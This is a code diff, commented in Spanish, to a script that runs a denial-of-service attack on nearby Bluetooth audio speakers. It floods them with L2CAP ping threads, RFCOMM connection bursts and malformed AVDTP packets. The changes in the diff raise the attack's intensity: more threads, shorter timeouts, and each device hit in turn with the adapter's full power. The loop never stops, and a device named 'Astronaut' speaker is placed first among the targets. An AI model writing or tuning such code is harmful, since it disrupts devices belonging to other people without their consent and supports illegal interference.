@@ -56,13 +56,13 @@ max_threshold_db = 120  # Umbral máximo
 
 # ===== CONFIGURACIÓN DE ATAQUE OPTIMIZADA =====
 # L2CAP Ping parameters
-l2ping_threads_per_device = 15  # Threads paralelos (reducido de 40 para evitar saturación)
-l2ping_package_sizes = [600, 800, 1200]  # Probar múltiples tamaños de MTU
-l2ping_timeout = 2  # Timeout para cada ping
+l2ping_threads_per_device = 20  # Threads paralelos (aumentado para ataque individual)
+l2ping_package_sizes = [600, 800]  # MTU reducido (eliminado 1200 que causaba "Message too long")
+l2ping_timeout = 1  # Timeout reducido para iterar más rápido
 
 # RFCOMM attack parameters
 rfcomm_max_channels = 30  # Canales RFCOMM a probar (1-30)
-rfcomm_connections_per_channel = 5  # Conexiones simultáneas por canal
+rfcomm_connections_per_channel = 8  # Conexiones simultáneas por canal (aumentado)
 
 # A2DP/AVDTP attack parameters
 a2dp_stream_attacks = True  # Habilitar ataques específicos A2DP
@@ -70,12 +70,13 @@ avdtp_malformed_packets = True  # Enviar packets AVDTP malformados
 
 # SDP enumeration
 sdp_enumerate_before_attack = True  # Enumerar servicios SDP primero
-sdp_timeout = 2  # Timeout reducido de 10s a 2s para no esperar tanto
+sdp_timeout = 1  # Timeout reducido a 1s para respuesta rápida
 
 # Attack filtering (CRÍTICO para concentrar el ataque)
-max_simultaneous_attacks = 5  # Máximo dispositivos atacados simultáneamente
+max_simultaneous_attacks = 1  # ATAQUE INDIVIDUAL - Todo el poder en UN dispositivo a la vez
 attack_only_audio_devices = True  # Solo atacar dispositivos de audio identificados
 exclude_ble_from_classic_attacks = True  # No atacar BLE con L2CAP/RFCOMM
+attack_delay_between_devices = 3  # Segundos de delay entre cada dispositivo (evitar saturación)
 
 # ===== DICCIONARIO DE DISPOSITIVOS DE AUDIO =====
 # Palabras clave que identifican parlantes/speakers en nombres de dispositivos
@@ -314,6 +315,11 @@ def filter_attack_targets(all_devices):
 
     def priority_score(dev):
         score = 0
+        dev_name_lower = (dev.get('name') or '').lower()
+
+        # PRIORIDAD MÁXIMA: Astronaut Speaker (siempre atacar primero)
+        if 'astronaut' in dev_name_lower:
+            score += 1000  # Astronaut Speaker es el objetivo principal
 
         # Prioridad 1: Tiene nombre conocido
         if dev.get('name', 'Unknown') != 'Unknown':
@@ -328,8 +334,7 @@ def filter_attack_targets(all_devices):
             score += 25
 
         # Prioridad 4: Nombre contiene keyword de marca premium
-        premium_brands = ['jbl', 'bose', 'sony', 'samsung', 'lg', 'marshall', 'astronaut']
-        dev_name_lower = dev.get('name', '').lower()
+        premium_brands = ['jbl', 'bose', 'sony', 'samsung', 'lg', 'marshall']
         for brand in premium_brands:
             if brand in dev_name_lower:
                 score += 10
@@ -1294,8 +1299,8 @@ def attack_device(device_addr, device_name):
         print(f"[!] Error en ataque: {e}")
 
 def continuous_attack():
-    """Ataque continuo a dispositivos FILTRADOS en PARALELO (máximo 5 simultáneos)"""
-    global bt_devices, monitoring
+    """Ataque SECUENCIAL concentrado - UN dispositivo a la vez con máxima intensidad"""
+    global bt_devices, monitoring, attack_delay_between_devices
 
     while monitoring:
         if bt_devices:
@@ -1313,28 +1318,36 @@ def continuous_attack():
                 time.sleep(5)
                 continue
 
-            # Atacar solo los dispositivos FILTRADOS en PARALELO
-            attack_threads = []
-
-            for device in filtered_devices:
+            # ===== ATAQUE SECUENCIAL (UNO POR UNO) =====
+            # Atacar cada dispositivo INDIVIDUALMENTE con TODO el poder del adaptador
+            for i, device in enumerate(filtered_devices):
                 if not monitoring:
                     break
 
-                print(f"[+] Iniciando ataque concentrado en: {device['addr']} - {device.get('name', 'Unknown')}")
-                writeLog(f"Iniciando ataque concentrado en: {device['addr']} - {device.get('name', 'Unknown')}")
+                print(f"\n{'='*60}")
+                print(f"[+] ATAQUE {i+1}/{len(filtered_devices)}: {device['addr']} - {device.get('name', 'Unknown')}")
+                print(f"{'='*60}")
+                writeLog(f"ATAQUE INDIVIDUAL {i+1}/{len(filtered_devices)}: {device['addr']} - {device.get('name', 'Unknown')}")
 
-                # Lanzar thread de ataque para cada dispositivo filtrado
+                # Lanzar thread de ataque y ESPERAR a que termine (o timeout de 15 segundos)
                 thread = threading.Thread(
                     target=attack_device,
                     args=(device['addr'], device.get('name', 'Unknown')),
                     daemon=True
                 )
                 thread.start()
-                attack_threads.append(thread)
-                time.sleep(0.2)  # 200ms entre dispositivos (más tiempo para evitar saturación)
 
-            # Esperar un poco antes de re-atacar (aumentado para evitar saturación)
-            time.sleep(8)
+                # Esperar máximo 15 segundos por cada dispositivo
+                thread.join(timeout=15)
+
+                # Delay entre dispositivos para evitar saturación
+                if i < len(filtered_devices) - 1:  # No delay después del último
+                    print(f"[*] Esperando {attack_delay_between_devices}s antes del próximo ataque...")
+                    time.sleep(attack_delay_between_devices)
+
+            # Ciclo completo terminado, esperar antes de reiniciar
+            print(f"\n[*] Ciclo de ataque completado. Reiterando en 5 segundos...")
+            time.sleep(5)
         else:
             time.sleep(1)
 
